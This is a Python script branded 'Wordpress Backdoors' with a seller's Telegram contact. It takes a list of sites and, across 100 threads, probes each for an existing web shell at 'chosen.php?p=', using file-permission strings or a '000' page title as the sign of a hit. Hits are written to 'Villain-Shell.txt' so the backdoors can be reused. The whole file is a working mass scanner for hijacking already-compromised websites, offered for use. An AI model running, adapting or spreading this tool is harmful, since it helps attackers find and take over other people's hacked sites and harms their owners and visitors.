import requests
from multiprocessing.dummy import Pool
import os,re,sys

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'  # Reset color to default#vn 


print(colors.RED + 'This text is red!' + colors.RESET)
print(colors.GREEN + 'This text is green!' + colors.RESET)
print(colors.YELLOW + 'This text is yellow!' + colors.RESET)
print(colors.BLUE + 'This text is blue!' + colors.RESET)
print(colors.MAGENTA + 'This text is magenta!' + colors.RESET)
print(colors.CYAN + 'This text is cyan!' + colors.RESET)
print(colors.WHITE + 'This text is white!' + colors.RESET)


def URLdomain(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site

    return site

def villain(site):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        site = URLdomain(site)
        req = requests.get(site + 'chosen.php?p=', headers=headers, verify=True, timeout=15)
        if "-rw-r--r--" in req.text or "<title>000</title>" in req.text:
            print(colors.GREEN +" VN-VULN : " +site+ colors.RESET)
            open("Villain-Shell.txt", "a").write(site + "chosen.php?p=\n")

        else:
            print(colors.RED +" VN-NOT-VULN : " + colors.RESET+site)
    except:
        pass


def run():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(colors.MAGENTA +'''\n    ██╗   ██╗███╗  ██╗    ██╗   ██╗██╗██╗     ██╗      █████╗ ██╗███╗  ██╗\n    ██║   ██║████╗ ██║    ██║   ██║██║██║     ██║     ██╔══██╗██║████╗ ██║\n    ╚██╗ ██╔╝██╔██╗██║    ╚██╗ ██╔╝██║██║     ██║     ███████║██║██╔██╗██║\n     ╚████╔╝ ██║╚████║     ╚████╔╝ ██║██║     ██║     ██╔══██║██║██║╚████║\n      ╚██╔╝  ██║ ╚███║      ╚██╔╝  ██║███████╗███████╗██║  ██║██║██║ ╚███║\n       ╚═╝   ╚═╝  ╚══╝       ╚═╝   ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚══╝\n                    Wordpress Backdoors\n                    DM : @vnsellar\n                    Telegram : https://t.me/vnvillain \n\n''')
    filename = input(colors.YELLOW +" Enter List => "+colors.RED )
    try:
        with open(filename, mode='r') as file:
            sites = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[!] File Not Found")
        exit()


    
    with Pool(100) as p:
        p.map(villain, sites)

if __name__ == "__main__":
    run()
    